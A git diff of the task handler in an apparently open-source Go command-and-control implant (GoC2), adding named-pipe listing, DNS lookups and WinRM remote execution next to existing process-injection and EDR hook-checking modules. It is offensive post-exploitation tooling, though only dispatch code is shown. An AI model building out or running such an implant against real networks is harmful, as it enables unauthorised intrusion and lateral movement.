@@ -29,6 +29,7 @@ import (
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/env"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/hookchecker"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/ifconfig"
+	"github.com/latortuga71/GoC2/internal/modules/enumeration/listpipes"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/listports"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/listservices"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/listshares"
@@ -345,6 +346,15 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = processinjection.ModuleStomp(t.File, t.Args[0])
 	case "hook-check":
 		result, cmdError = hookchecker.HookChecker("")
+	case "nslookup":
+		result, cmdError = basic.Nslookup(t.Args[0])
+	case "reverse-lookup":
+		result, cmdError = basic.ReverseLookup(t.Args[0])
+	case "list-pipes":
+		result, cmdError = listpipes.ListPipes()
+	case "winrm-exec":
+		result, cmdError = exectools.WinRmExec(t.Args)
+		exectools.ResetResults()
 	default:
 		result, cmdError = "", errors.New("Command Not Found.")
 	}
